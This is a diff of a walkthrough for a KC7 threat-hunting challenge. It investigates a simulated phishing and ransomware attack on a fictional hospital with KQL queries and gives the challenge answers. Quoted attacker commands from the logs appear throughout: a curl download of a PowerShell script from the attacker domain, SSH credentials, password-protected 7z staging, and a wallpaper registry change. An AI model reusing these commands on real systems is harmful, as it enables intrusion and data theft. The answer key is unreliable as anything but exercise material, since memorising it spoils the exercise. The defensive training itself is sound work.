@@ -1,4 +1,4 @@
-Alright, for this one, our learning objectives are:
+For this one, our learning objectives are:
 - Map attacker actions to the MITRE ATT&CK framework throughout an investigation
 - Understand the Cyber Kill Chain and how attack phases connect
 - Investigate phishing campaigns impersonating trusted partners
@@ -8,84 +8,67 @@ Alright, for this one, our learning objectives are:
 - Follow data staging, compression, and exfiltration
 - Analyze ransomware deployment and impact indicators
 
-Let's dive right into section 1: KQL 101!
+https://kc7cyber.com/challenges/174#
+
+Section 1: KQL 101!
 How many employees work at Azure Crest Hospital?
 Employees
 | count
-So this one will go to the Employees table and simply count the number of rows.
 Answer: 250
 
 What is the Chief Financial Officer's name?
 Employees
 | where role == "Chief Financial Officer"
-And this one will look up roles in the Employees table and only return the row where the role is "Chief Financial Officer".
 Answer: Penny Pincher
 And for future reference, Penny's: IP - 10.10.0.1, email - penny_pincher@azurecresthospital.med, username - pepincher, and hostname - TEX4-MACHINE
 
 How many emails did Penny Pincher receive?
-We are given this template:
 Email
 | where recipient == "<Penny Pincher's Email Address Here>"
 | count
-So let's plug in the relevant info and we get: 30
+Answer: 30
 
 How many distinct senders were seen in the email logs from pharmabest.net?
-And we are given:
 Email
 | where sender has "<Domain Name>"
 | distinct <field>
 | count
-Let's plug in "pharmabest.net" and "sender" and we get: 236
+Plug in "pharmabest.net" and "sender": 236
 
 How many distinct websites did “Penny Pincher” visit?
-And we're given:
 OutboundNetworkEvents
 | where src_ip == "<Penny Pincher's IP>"
 | <operator> <field>
 | <operator>
-Luckily, we took notes earlier, so let's plug in her IP, "distinct" and "url", and "count".
+Plug in her IP, "distinct" and "url", and "count".
 Answer: 68
 
 How many distinct domains in the PassiveDns records contain the word “health”?
-And we have: 
 PassiveDns
 | where <field> contains <value>
 | <operator> <field>
 | <operator>
-Let's plug in: domain, health, distinct, domain, count
+Plug in: domain, health, distinct, domain, count
 Answer: 28
 
 What IPs did the domain “bit.ly” resolve to (enter any one of them)?
-And we are given:
 PassiveDns
-| where domain == "<domain>"
-| distinct <field>
-Let's plug in: "bit.ly", ip
+| where domain == "bit.ly"
+| distinct ip
 There are 2: 134.177.143.174, 42.143.126.108
 
 How many distinct URLs did employees with the first name "Mary" Visit?
-Getting a little trickier. We are given:
 let mary_ips = 
 Employees
-| where name has "<Employee Name>"
+| where name has "mary"
 | distinct ip_addr;
 OutboundNetworkEvents
 | where src_ip in (mary_ips)
-<more kql here>
-So this will create a variable called mary_ips. It will store in that variable the output of the next block, which in this case goes to Employees, looks up any employee named Mary, and grabs the unique IP addresses associated. After that, it will go to the OutboundNetworkEvents table, look for a src_ip that matches any IP just found in mary_ips, and then we have to plug in the rest. The rest being:
 | distinct url
 | count
 Answer: 119
 
 How many authentication attempts did we see to the accounts of employees with the first name Mary?
-This time we are only given:
-let <list_variable_name> = Employees
-| where name has "<Employee Name>"
-| distinct username;
-AuthenticationEvents
-| where username in (<list_variable_name>)
-| count
-So here's what I came up with:
 let users = 
 Employees
 | where name has "Mary"
@@ -93,67 +76,58 @@ Employees
 AuthenticationEvents
 | where username in (users)
 | count
-The logic forthe previous question is roughly the same here, just with AuthenticationEvents instead of OutboundNetworkEvents.
 Answer: 180
 
 
 Section 2: Quarantine Quandry
 We received a security alert a few days ago that a file with the word 'healthcare' was quarantined. What is the name of the file that was quarantined?
-Alright, no template here. Let's give this a shot:
 FileCreationEvents
 | where filename contains "healthcare"
-I ran that, but it returns ALL of the info for the file creation event. Let's add:
 | distinct filename
-And that will throw out just the filename.
 Answer: New_Healthcare_Protocols.docm
 
 What is the hostname of the computer that contained this file?
 FileCreationEvents
 | where filename contains "healthcare"
 | distinct hostname
-This returns 23 results, though. Through the help of KC7's Discord, I was informed of a table called SecurityAlerts, so let's check that table out:
+This returns 23 results, though. Through the help of KC7's Discord, I was informed of a table called SecurityAlerts, so:
 SecurityAlerts
 | where indicators contains "healthcare"
-This returns 2 results, one for a HOST and one for an EMAIL. Let's go to the HOST one and grab the hostname (also in the indicators field): ZQHM-LAPTOP
+This returns 2 results, one for a HOST and one for an EMAIL. Go to the HOST one and grab the hostname (also in the indicators field): ZQHM-LAPTOP
 
 What is the name of the employee that this computer belongs to?
-Let's go back to the Employees table:
 Employees
 | where hostname == "ZQHM-LAPTOP"
 Answer: Jerry Jones
 And for reference later: Jerry's IP - 10.10.0.174, email - jerry_jones@azurecresthospital.med, username - jejones, role - Resident Doctors
 
 What is that employee's role at Azure Crest Hospital?
-Thank goodness we just took notes!
+Answer: Resident Doctors
 
 When was this file created on the doctor's computer? (paste the full timestamp)
-Back to FileCreationEvents:
 FileCreationEvents
 | where hostname == "ZQHM-LAPTOP"
 | where filename contains "healthcare"
 Answer: 2024-03-14T10:38:36.000Z
 
 What process did we see create this file? (process name)
-Scroll all the way to the right: chrome.exe
+chrome.exe
 
 What domain was the file downloaded from?
-Let's try this out (just to try, not even sure if it's right):
 OutboundNetworkEvents
 | where url contains "New_Healthcare_Protocols.docm"
-Well, that gives us 9 unique results, so probably not that. Oh, right! Let's add in the IP as a filter:
+Well, that gives us 9 unique results, so probably not that. Add in the IP as a filter:
 | where src_ip == "10.10.0.174"
 And then we see one result, with a URL of: http://takeyatimecarepartners.com/images/images/files/New_Healthcare_Protocols.docm
 Answer: takeyatimecarepartners.com
 
 Which legitimate Azure Crest partner's domain is the threat actor attempting to mimic?
-If we go back to the Emails table and look for some key"words" within that domain name, we can filter on those:
 Email
-| where link contains "take"
-Hmm.. nothing new there.. let's replace "take" with "care"
+| where link contains "care"
 And we see: emergencycarepartners.com
 
 What is Jerry's email address?
-Good thing we took notes earlier!
+jerry_jones@azurecresthospital.med
 
 How many emails did Jerry Jones receive?
 Email
@@ -176,14 +150,13 @@ Even more suspicious that it doesn't match the sender!
 
 What is the subject of the email?
 [EXTERNAL] FW: 🚑 Attention Required: Urgent Pediatric Health Procedure Update 🌈
-And it's an external email? Definitely fishy (or... phishy?)
+And it's an external email. Getting more and more suspicious.
 
 It looks like Jerry received another email from this sender. When did Jerry receive that email? (paste the full timestamp)
-Really, what we're looking for here is the reply_to column (because filtering on the sender column only gave us back that 1 email):
 Email
 | where recipient == "jerry_jones@azurecresthospital.med"
 | where reply_to == "healthupdate@gmail.com"
-And we see another email sent at: 2024-03-06T11:49:48.000Z
+Answer: 2024-03-06T11:49:48.000Z
 
 What is filename seen in the link?
 Pediatric_Care_Update.docm
@@ -191,72 +164,62 @@ Pediatric_Care_Update.docm
 
 Section 3: The Phisher's Net
 How many Azure Crest employees received emails containing a link to the previously identified (.docm) files?
-This one gets a bitmore involved:
 Email
 | where link has_any ("Pediatric_Care_Update.docm", "New_Healthcare_Protocols.docm")
 | distinct recipient 
-This will filter out emails with those 2 filenames in the link field, and find the unique recipients.
 Answer: 40
 
 How many distinct subjects did the threat actors use in this batch of emails?
-Change the previous query from "distinct recipient" to "distinct subject"
 Email
 | where link has_any ("Pediatric_Care_Update.docm", "New_Healthcare_Protocols.docm")
 | distinct subject 
-However, this gives 11 results. Confirmed in the Discord that that is the incorrect answer, so we'll have to eyeball this one. Filter out (manually, so as not to make mistakes in querying - it seems creating 1 query for this would be very convoluted) the unique ones.
 Answer: 7
 
 How many distinct links did the threat actors use in this batch of emails?
-This one should work if we change "distinct recipient" to "distinct link"
 Answer: 17
 For the record, those are: unhealthyrecordsystems.tech, medequipamateurs.org, takeyatimecarepartners.com, pharmasecondbest.net 
 Those resolve to the IPs of: 62.121.133.43, 25.126.98.121, 16.101.245.182, 215.95.144.58, 131.92.62.82, 115.12.60.150, 131.190.102.173, 93.142.203.80, 135.103.59.74, 96.120.124.180
 
 
 How many distinct domains were used in this batch of emails?
-I'd just eyeball this one: 4
+Answer: 4
 
 How many employees clicked on the email links?
 OutboundNetworkEvents
 | where url has_any ("Pediatric_Care_Update.docm", "New_Healthcare_Protocols.docm")
 | distinct src_ip
-This will check for outbound connections (from internal to the rest of the world), look for those files in the URL, and return the unique IPs.
 Answer: 37
-Uh oh!
 
 How many records are there for either of these files being on Azure Crest employee computers?
-Very similar query:
 FileCreationEvents
 | where filename has_any ("Pediatric_Care_Update.docm", "New_Healthcare_Protocols.docm")
 Answer: 38
-Even more uh oh!
+This is confirmation that the suspicious documents made their way into the network. There will likely be more activity now.
 
 What is the timestamp for the first time one of these files was created?
 2024-03-01T11:58:33.000Z
 
 What is the name of the file that is created after the suspicious file is downloaded?
-Ok, let's take the hostname from that timestamp we just used: P3EX-DESKTOP
-And try:
+Take the hostname from that timestamp we just used: P3EX-DESKTOP
 FileCreationEvents
 | where hostname == "P3EX-DESKTOP"
 | where timestamp > datetime(2024-03-01T11:58:33.000Z)
-This will filter on that first host to download it and look for events after that initial download. The very first result should be our answer: heartburn.zip
+The very first result should be our answer: heartburn.zip
 
 What is the directory path that contains this new file?
-Back one columns to the left: C:\ProgramData\Heartburn
+Answer: C:\ProgramData\Heartburn
 
 On that machine, how many additional files are created in the same directory?
-Let's add this to our query:
+Add this to the query:
 | where path contains "C:\\ProgramData\\Heartburn"
 And the double slashes are to escape the character.
 Answer: 3
 
 What command was used to extract the additional files from the zip file into the same directory where it was located?
-For this, let's go to ProcessEvents:
 ProcessEvents
 | where hostname == "P3EX-DESKTOP"
 | where process_commandline contains "heartburn.zip"
-This will go to that hostname in the table and find command line instances where that zip file was mentioned: cmd.exe /c Expand-Archive -Path C: \ProgramData\heartburn.zip -DestinationPath C:\ProgramData\Heartburn
+Answer: cmd.exe /c Expand-Archive -Path C: \ProgramData\heartburn.zip -DestinationPath C:\ProgramData\Heartburn
 
 What is the IP address that putty.exe uses to establish it's SSH connection?
 Change "heartburn.zip" to "putty" and we get:
@@ -267,18 +230,16 @@ What does the acronym SSH stand for?
 This is open source intelligence or prior knowledge: secure shell
 
 How many unique IP addresses were used to initiate similar SSH connections?
-I did this:
 ProcessEvents
 | where process_commandline contains "putty"
 | distinct process_commandline
-Which will grab distinct commands, meaning it would grab the ones with different IPs listed in the command.
 Answer: 17
 
 What username is used to initiate the SSH connection?
-Just look a bit closer at those results: have_ya_tried
+Answer: have_ya_tried
 
 What is the password used to initiate the SSH connection?
-Same deal: turning_it_off_and_on_again
+Answer: turning_it_off_and_on_again
 
 Discovery commands are often run by an attacker to collect information about the target system or network. How many of these commands were run on the victim's computer?
 For this, I looked up what is considered a discovery command (hint: I used this source - https://car.mitre.org/analytics/CAR-2016-03-001/)
@@ -300,30 +261,26 @@ ProcessEvents
 Answer: 35
 
 This Twitter user, also known as "Hutch", co-authored the paper that introduced the Cyber Kill Chain to information security. (enter their @ username)
-Putting something like this into Google should get you the answer pretty quickly: Cyber Kill Chain twitter hutch
+Answer: @killchain
 
 
 Section 4: Derpy Database
 What is the first step of the Cyber Kill Chain?
-Generic open source intelligence: Reconnaissance
+Open source intelligence: Reconnaissance
 
 How many records are there of the threat actor browsing the Azure Crest Hospital's website?
-This one is a bit more complicated:
 let ips =
 InboundNetworkEvents
 | where url has_all ("azure", "search")
 | distinct src_ip;
 InboundNetworkEvents
 | where src_ip in (ips)
-This makes a variable called ips, and in that variable, we put the  distinct source IPs from InboundNetworkEvents where the IP "search"ed the "azure"crest site. Then, we take those IPs, and just filter on those in the InboundNetworkEvents in general.
 This only gives 31, though, and the answer is 32. I'm assuming the last one is because they went to the site itself first.
-Edit: Later, I went back to S3Q3 and got IPs for the domains, and then queried:
+(Edit: Later, I went back to S3Q3 and got IPs for the domains, and then queried:
 InboundNetworkEvents
-| where src_ip has_any ("62.121.133.43", "25.126.98.121", "16.101.245.182", "215.95.144.58", "131.92.62.82", "115.12.60.150", "131.190.102.173", "93.142.203.80", "135.103.59.74", "96.120.124.180")
-And got 32 :)
+| where src_ip has_any ("62.121.133.43", "25.126.98.121", "16.101.245.182", "215.95.144.58", "131.92.62.82", "115.12.60.150", "131.190.102.173", "93.142.203.80", "135.103.59.74", "96.120.124.180"))
 
 What article did they read about personnel changes at the hospital? (provide full url)
-Since the blurb before the question tells us that this is to save money, I tried:
 InboundNetworkEvents
 | where src_ip has_any ("62.121.133.43", "25.126.98.121", "16.101.245.182", "215.95.144.58", "131.92.62.82", "115.12.60.150", "131.190.102.173", "93.142.203.80", "135.103.59.74", "96.120.124.180")
 | where url contains "money"
@@ -343,7 +300,6 @@ InboundNetworkEvents
 Answer: pediatric
 
 Which employee did the threat actor ultimately decide to target?
-Using the query of just:
 InboundNetworkEvents
 | where src_ip has_any ("62.121.133.43", "25.126.98.121", "16.101.245.182", "215.95.144.58", "131.92.62.82", "115.12.60.150", "131.190.102.173", "93.142.203.80", "135.103.59.74", "96.120.124.180")
 We see Penny Pincher and Roy Trenneman were searched. Answer is Roy Trenneman.
@@ -355,28 +311,24 @@ Answer: Database Administrator
 For reference: hostname - SUPER-DB-SERVER-9000, username - rotrenneman, email - roy_trenneman@azurecresthospital.med, IP - 10.10.0.2
 
 What is the timestamp of the email that the threat actor sent to that employee?
-Well, we aren't sure what's going on with the spelling of Roy's name right now, so let's try:
 Email
 | where reply_to == "healthupdate@gmail.com" //Remember this from earlier
 | where recipient contains "roy"
 Answer: 2024-03-04T10:52:18.000Z
 
 Did that employee click on the link? (yes/no)
-Let's try:
 OutboundNetworkEvents
 | where url == "http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm" //The link from the email
 | where src_ip == "10.10.0.2" //Roy's IP
-Answer: yes :(
+Answer: yes
 
 What is the timestamp for when the docm file was created on Roy's machine?
-Try:
 FileCreationEvents
 | where filename contains "docm"
 | where hostname == "SUPER-DB-SERVER-9000" //His hostname
 Answer: 2024-03-04T11:28:57.000Z
 
 What is the name of the first malicious file created by the threat actor in the user's Temp folder?
-Let's take that timestamp and look for files in Temp after that date and time:
 FileCreationEvents
 | where timestamp > datetime(2024-03-04T11:28:57.000Z)
 | where path contains "Temp"
@@ -384,40 +336,35 @@ FileCreationEvents
 Answer: dbhunter.exe
 
 What types of files does dbhunter.exe search for upon execution? (enter any one of them)
-Let's check ProcessEvents for that one:
 ProcessEvents
 | where timestamp > datetime(2024-04-01T15:13:25.000Z) //Timestamp of dbhunter.exe being created
 | where hostname == "SUPER-DB-SERVER-9000"
-And we get: dbhunter.exe --search --filetype .db .sql .mdb --output C:\\In\\found_databases.txt
+Result: dbhunter.exe --search --filetype .db .sql .mdb --output C:\\In\\found_databases.txt
 Possible answers: .db, .sql, .mdb
 
 What password is used to encrypt the compressed file containing Roy's meme collection?
-Let's add in this line:
 | where process_commandline contains "meme"
-And we see: 7z.exe a -t7z C:\\Out\\Roys_Meme_Collection.7z C:\\Out\\*meme*.mdb -p mommawemadeit
+Result: 7z.exe a -t7z C:\\Out\\Roys_Meme_Collection.7z C:\\Out\\*meme*.mdb -p mommawemadeit
 Answer: mommawemadeit
 
 The execution of UrTottalyPwned.bat triggers the encryption of database files. What extension has been added to the files to indicate that they have been encrypted?
-First, let's do this to get a timestamp of that bat being run:
 ProcessEvents
 | where timestamp > datetime(2024-04-01T15:13:25.000Z)
 | where hostname == "SUPER-DB-SERVER-9000"
 | where process_commandline contains "UrTottalyPwned.bat"
 Timestamp: 2024-04-02T11:31:47.000Z
-Then, let's look for file creations after that particular timestamp:
+Then, look for file creations after that particular timestamp:
 FileCreationEvents
 | where timestamp > datetime(2024-04-02T11:31:47.000Z)
 | where hostname == "SUPER-DB-SERVER-9000"
 Answer: .scholopendra
 
 A command was executed to modify registry settings, altering the desktop wallpaper for all user profiles. This change indicates that the files throughout the database had been encrypted by the threat actor. What is the name of the new wallpaper?
-Let's try this out:
 ProcessEvents
 | where timestamp > datetime(2024-04-02T11:31:47.000Z)
 | where hostname == "SUPER-DB-SERVER-9000"
 | where process_commandline contains "wallpaper"
-We see this command:
-cmd.exe /c reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f && reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f
+Result: cmd.exe /c reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f && reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f
 So the answer is: ItWentWrong.jpg
 
 
@@ -429,7 +376,7 @@ Enter the MITRE ATT&CK ID corresponding to this technique. In this technique, ad
 T1574
 
 This cybersecurity personality likes to impose cost on adversaries. What's his username on X/Twitter?
-It's literally just ImposeCost
+ImposeCost
 
 What is the name of the malware used by North Korean cyber actors in an attack against the Kudankulam Nuclear Power Plant in India?
 Page 6 here - https://www.vifindia.org/sites/default/files/cyber-attack-on-kudankulam-nuclear-power-plant.pdf
@@ -497,5 +444,5 @@ curl.exe -o C:\ProgramData\Heartburn\anydesk_automation.ps1 https://unhealthyrec
 
 bmVxYXJjYnlidXBmLm9xLmZydmViZ2FyaWF2X3lucHZxcnpyYnpycnJhdnZ2enJycnZ2YXJycnpycnJ2dmFycnJycnJienJycmF2dnZ6cnJydnZhcnJyenJycnZ2YXJycnJycmZub25nblFyYnpycnJhdnZ2enJycnZ2YXJycnpycnJ2dmFycnJycnJienJycmF2dnZ6cnJydnZhcnJyenJycnZ2YXJycnJyenJnZmxGcmJ6cnJyYXZ2dnpycnJ2dmFycnJ6cnJydnZhcnJycnJyYnpycnJhdnZ2enJycnZ2YXJycnpycnJ2dmFycnJycjpQ
 From Base64, then reverse, then ROT13 - C:eeeeeniieeemeeeniieeemiiineeemoeeeeeeniieeemeeeniieeemiiineeemoeSystemeeeeeniieeemeeeniieeemiiineeemoeeeeeeniieeemeeeniieeemiiineeemoeDatabaseeeeeeniieeemeeeniieeemiiineeemoeeeeeeniieeemeeeniieeemiiineeemoemedical_inventories.db.scholopendra
-A;; pf the eeniemeenies are \
+All of the eeniemeenies are \
 C:\System\Database\medical_inventories.db.scholopendra
